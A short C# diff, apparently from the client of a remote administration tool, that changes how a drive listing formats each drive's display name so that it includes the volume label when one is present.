@@ -24,7 +24,17 @@ namespace xClient.Core.Commands
             string[] rootDirectory = new string[drives.Length];
             for (int i = 0; i < drives.Length; i++)
             {
-                displayName[i] = string.Format("{0} ({1}, {2})", drives[i].RootDirectory.FullName, Helper.Helper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                var volumeLabel = drives[i].VolumeLabel;
+                if (string.IsNullOrEmpty(volumeLabel))
+                {
+                    displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
+                        Helper.Helper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                }
+                else
+                {
+                    displayName[i] = string.Format("{0} ({1}) [{2}, {3}]", volumeLabel, drives[i].RootDirectory.FullName,
+                        Helper.Helper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                }
                 rootDirectory[i] = drives[i].RootDirectory.FullName;
             }
 
